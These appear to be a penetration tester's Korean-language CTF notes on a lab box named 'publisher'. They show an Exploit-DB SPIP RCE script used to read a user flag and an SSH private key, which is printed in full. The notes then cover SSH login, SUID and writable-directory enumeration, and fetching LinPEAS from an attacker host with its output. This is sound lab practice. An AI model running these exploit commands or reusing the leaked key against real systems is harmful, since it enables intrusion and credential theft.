python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "cat /home/think/user.txt" --verbose
fa229046d44eda6a3598c73ad96f4ca5
python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "ls -al /home/think/.ssh" --verbose

-rw-r--r-- 1 root root 569 Jan 10 2024 authorized_keys
-rw-r--r-- 1 think think 2602 Jan 10 2024 id_rsa
-rw-r--r-- 1 think think 569 Jan 10 2024 id_rsa.pub

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "cat /home/think/.ssh/id_rsa" --verbose

# RSA 탈취

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

# 비밀번호 계속 요구함 -> pem 있는데 요구하도록 설정이 된건가?

┌──(root㉿docker-desktop)-[/]
└─# sudo ssh -i think.pem think@10.201.11.134

** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
\*\* The server may need to be upgraded. See https://openssh.com/pq.html
Load key "think.pem": error in libcrypto
think@10.201.11.134's password:

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "cat /home/think/.ssh/authorized_keys" --verbose

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDE+9z2mKOlQkDiiXK+RbSvJgBIGl2YFqw4SWzo5HDsUyCM9bzq0Mq4hfJmd4EhRqsmJmHxXMWqYpFhyKgPCUnOr73/aKlAdNXM2PHGDXzBa8XRacraUjlNDtBdw5jz7UJRVfrvLhResoBJ/yXuU8ogQPbhteOQMGRWsIwfBJxBuD+cggXHKLbrYmglOOH0mDFIGNoM4QsEHHJ2/vxgw313Jp8iYBdhf3ofmT7y8Lz8jduTCIKeG4oonXVNXhvyUyxuuCpthFh9sIlqkHbvMnbhrVpHlSf4RzZdXZ9rCGZ+1LTlvXQzRACcMS7tIZcb2YX+EsnKF5F7yW/6uTkSRk2CHXhilcb8T3IhvEH1F/mTR6TGh1mNVXTqKogcGiZxCsqi1XmdcFE+BV4fvUmBVAWQ1DKpUzjB/qg4NKpCy4i+eQHmX17T3mwkPDPWmP9pMvdnpnbwqA8oKM4Qu+QA9ydy4xBO77PpBVSvRwKOBJGHDgbL9t8niUvJf9tyIvlCjJ0= think@publisher

# think.pem -> id_rsa 로 파일명 변경 후 재시도 -> 성공 -> 파일 이름이 .pem 이면 다른 방식으로 시도함 -> id_rsa 방식이면 그에 맞게 파일명도 변경하는 것이 적절

sudo ssh -i id_rsa think@10.201.11.134

# flag 1

think@ip-10-201-43-138:~$ cat user.txt
fa229046d44eda6a3598c73ad96f4ca5

think@ip-10-201-43-138:/opt$ cat /etc/passwd
root:x:0:0:root:/root:/usr/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
\_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
think:x:1000:1000:,,,:/home/think:/usr/sbin/ash
fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
dnsmasq:x:115:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
rtkit:x:116:121:RealtimeKit,,,:/proc:/usr/sbin/nologin
avahi:x:117:124:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:118:125:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
pulse:x:119:126:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
geoclue:x:120:128::/var/lib/geoclue:/usr/sbin/nologin
saned:x:121:130::/var/lib/saned:/usr/sbin/nologin
colord:x:122:131:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
gdm:x:123:132:Gnome Display Manager:/var/lib/gdm3:/bin/false
ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash

# PE -> Privilege Escalation

# LinPEAS 는 자동 툴이라 OSCP 에서는 금지

허용: 정보 수집 (Enumeration) 기능.
금지: 자동 악용 (Automated Exploitation) 기능.

find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -a -perm /111 -type f 2>/dev/null

# SUID + SGID 동시 설정된 파일 찾기 (강력한 권한 상승 가능)

find / -perm -6000 -type f 2>/dev/null

think@ip-10-201-106-230:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
/usr/sbin/run_container
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount

# 린피스 탐색 셋팅 attacker

wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
sudo chmod 777 linpeas.sh
sudo mv linpeas.sh /tmp
python3 -m http.server 80

┌──(root㉿docker-desktop)-[/]
└─# ls
bin boot data dev etc home id_rsa lib lib64 linpeas.sh media mnt opt proc root run sbin srv sys tmp usr var vpn

# 공격자 컴에 있는 linpeas.sh 설치

wget http://10.8.136.212/tmp/linpeas.sh

Cannot write to ‘linpeas.sh’ (Permission denied).
think@ip-10-201-106-230:~$ wget wget http://10.8.136.212/tmp/linpeas.sh
--2025-11-09 09:17:38-- wget http://10.8.136.212/tmp/linpeas.sh
Connecting to 10.8.136.212:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 971926 (949K) [application/x-sh]
linpeas.sh: Permission denied

Cannot write to ‘linpeas.sh’ (Permission denied).
think@ip-10-201-106-230:~$

# 원격지에서 현재 디렉토리에 쓰기 권한이 없으므로 /tmp 로 이동 -> 여전히 권한문제 발생 -> wget 명령어를 outbound level 에서 blcok?

cd /tmp
wget http://10.8.136.212/tmp/linpeas.sh

think@ip-10-201-106-230:/tmp$ wget http://10.8.136.212/tmp/linpeas.sh
--2025-11-09 09:21:45-- http://10.8.136.212/tmp/linpeas.sh
Connecting to 10.8.136.212:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 971926 (949K) [application/x-sh]
linpeas.sh: Permission denied

Cannot write to ‘linpeas.sh’ (Permission denied).
think@ip-10-201-106-230:/tmp$

# 쓰기 권한 디렉토리 찾기

find / -writable -type d 2>/dev/null

think@ip-10-201-106-230:~$ find / -writable -type d 2>/dev/null
/var/lib/php/sessions
/var/tmp
/var/crash
/proc/2126/task/2126/fd
/proc/2126/fd
/proc/2126/map_files
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.font-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/pulseaudio.service
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/dbus.socket
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/dbus.service
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/pulseaudio.service
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.service
/home/think
/home/think/.gnupg
/home/think/.gnupg/private-keys-v1.d
/home/think/.cache
/home/think/.local
/home/think/.local/share
/home/think/.local/share/nano
/home/think/.ssh
/home/think/.config
/home/think/.config/pulse
/run/user/1000
/run/user/1000/dbus-1
/run/user/1000/dbus-1/services
/run/user/1000/pulse
/run/user/1000/gnupg
/run/user/1000/systemd
/run/user/1000/systemd/units
/run/screen
/run/cloud-init/tmp
/run/lock
/dev/mqueue
/dev/shm

# /dev/shm 쓰기 권한있는 곳으로 이동 후 설치 완료

think@ip-10-201-106-230:/dev/shm$ wget http://10.8.136.212/tmp/linpeas.sh
--2025-11-09 09:26:44-- http://10.8.136.212/tmp/linpeas.sh
Connecting to 10.8.136.212:80... connected.
HTTP request sent, awaiting response...
200 OK
Length: 971926 (949K) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh 100%[=================================================================================================================>] 949.15K 172KB/s in 5.5s

2025-11-09 09:26:50 (172 KB/s) - ‘linpeas.sh’ saved [971926/971926]

# 탐색만 실행

chmod +x /dev/shm/linpeas.sh
/dev/shm/linpeas.sh > /dev/shm/linpeas_result.txt

think@ip-10-201-106-230:~$ /dev/shm/linpeas.sh

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz         |
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          LinPEAS-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
LEGEND:
RED/YELLOW: 95% a PE vector
RED: You should take a look to it
LightCyan: Users with console
Blue: Users without console & mounted devs
Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
LightMagenta: Your username

Starting LinPEAS. Caching Writable Folders...
╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
╚═══════════════════╝
OS: Linux version 5.15.0-138-generic (buildd@lcy02-amd64-117) (gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025
User & Groups: uid=1000(think) gid=1000(think) groups=1000(think)
Hostname: ip-10-201-106-230

[+] /usr/bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /usr/bin/nc is available for network discovery & port scanning (LinPEAS can discover hosts and scan ports, learn more with -h)

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
. . . . DONE

                              ╔════════════════════╗

══════════════════════════════╣ System Information ╠══════════════════════════════
╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
Linux version 5.15.0-138-generic (buildd@lcy02-amd64-117) (gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025
Distributor ID: Ubuntu
Description: Ubuntu 20.04.6 LTS
Release: 20.04
Codename: focal

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
Sudo version 1.8.31

╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

╔══════════╣ Date & uptime
Sun 09 Nov 2025 09:27:53 AM UTC
09:27:53 up 1:38, 1 user, load average: 0.44, 0.10, 0.03

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
/dev/disk/by-id/dm-uuid-LVM-v005ZedA7j7y56QkhMFFxIpAPjQzs7oulfbhGyXQdL80hdoMd7f940eF6eIyyall / ext4 defaults 0 1
/dev/disk/by-uuid/fe853f08-cc6e-4ac9-9eaf-a0d076c2c15d /boot ext4 defaults 0 1
/dev/disk/by-id/dm-uuid-LVM-v005ZedA7j7y56QkhMFFxIpAPjQzs7ouomUCv50xJe6dL15kDJr03lqYwKfBVOfc none swap sw 0 0

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk

╔══════════╣ Environment
╚ Any private information inside environment variables?

sudo ssh -i id_rsa think@10.201.11.134
wget http://10.8.136.212/tmp/linpeas.sh
./linpeas.sh

# ubuntu, root

uid=0(root) gid=0(root) groups=0(root)
uid=1000(think) gid=1000(think) groups=1000(think)
uid=1001(ubuntu) gid=1001(ubuntu) groups=1001(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),116(lxd),123(netdev)

# linPEAS.sh result

```sh
-rw-r--r-- 1 root root 72539 Jun 27  2023 /etc/php/7.4/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Checking if containerd(ctr) is available
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#containerd-ctr-privilege-escalation
ctr was found in /usr/bin/ctr, you may be able to escalate privileges with it
ctr: failed to dial "/run/containerd/containerd.sock": connection error: desc = "transport: error while dialing: dial unix /run/containerd/containerd.sock: connect: permission denied"

╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/index.html#docker-breakout--privilege-escalation
lrwxrwxrwx 1 root root 33 Nov 13  2023 /etc/systemd/system/sockets.target.wants/docker.socket -> /lib/systemd/system/docker.socket
-rw-r--r-- 1 root root 171 Oct 11  2024 /usr/lib/systemd/system/docker.socket
-rw-r--r-- 1 root root 0 Nov 13  2023 /var/lib/systemd/deb-systemd-helper-enabled/sockets.target.wants/docker.socket

╔══════════╣ Analyzing MariaDB Files (limit 70)

-rw------- 1 root root 317 Apr 27  2025 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Nov 11  2022 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Wifi Connections Files (limit 70)
drwxr-xr-x 2 root root 4096 Nov 27  2021 /etc/NetworkManager/system-connections
drwxr-xr-x 2 root root 4096 Nov 27  2021 /etc/NetworkManager/system-connections

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Apr 27  2025 /etc/pam.d
-rw-r--r-- 1 root root 2133 Dec  2  2021 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Apr 27  2025 /etc/ldap


╔══════════╣ Analyzing Cloud Credentials Files (limit 70)
pwsh Not Found









drwxr-sr-x 4 root staff 4096 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud
drwxr-sr-x 4 root staff 4096 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud
-rw-r--r-- 1 root staff 0 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/py.typed
-rw-r--r-- 1 root staff 212 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/__init__.py
drwxr-sr-x 2 root staff 4096 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/__pycache__
-rw-r--r-- 1 root staff 359 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/__pycache__/__init__.cpython-38.pyc
drwxr-sr-x 6 root staff 4096 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio
-rw-r--r-- 1 root staff 0 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/py.typed
drwxr-sr-x 3 root staff 4096 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/bigquery
-rw-r--r-- 1 root staff 0 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/bigquery/py.typed
-rw-r--r-- 1 root staff 4623 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/bigquery/bigquery.py
-rw-r--r-- 1 root staff 1319 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/bigquery/__init__.py
-rw-r--r-- 1 root staff 3970 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/bigquery/dataset.py
-rw-r--r-- 1 root staff 4454 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/bigquery/utils.py
-rw-r--r-- 1 root staff 13725 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/bigquery/table.py
-rw-r--r-- 1 root staff 6601 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/bigquery/job.py
drwxr-sr-x 2 root staff 4096 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/bigquery/__pycache__
-rw-r--r-- 1 root staff 5355 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/bigquery/__pycache__/utils.cpython-38.pyc
-rw-r--r-- 1 root staff 3007 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/bigquery/__pycache__/dataset.cpython-38.pyc
-rw-r--r-- 1 root staff 9083 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/bigquery/__pycache__/table.cpython-38.pyc
-rw-r--r-- 1 root staff 4805 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/bigquery/__pycache__/bigquery.cpython-38.pyc
-rw-r--r-- 1 root staff 4895 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/bigquery/__pycache__/job.cpython-38.pyc
-rw-r--r-- 1 root staff 1401 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/bigquery/__pycache__/__init__.cpython-38.pyc
drwxr-sr-x 3 root staff 4096 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/auth
-rw-r--r-- 1 root staff 0 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/auth/py.typed
-rw-r--r-- 1 root staff 11871 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/auth/session.py
-rw-r--r-- 1 root staff 9924 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/auth/token.py
-rw-r--r-- 1 root staff 2055 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/auth/__init__.py
-rw-r--r-- 1 root staff 5377 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/auth/iam.py
-rw-r--r-- 1 root staff 735 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/auth/utils.py
-rw-r--r-- 1 root staff 184 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/auth/build_constants.py
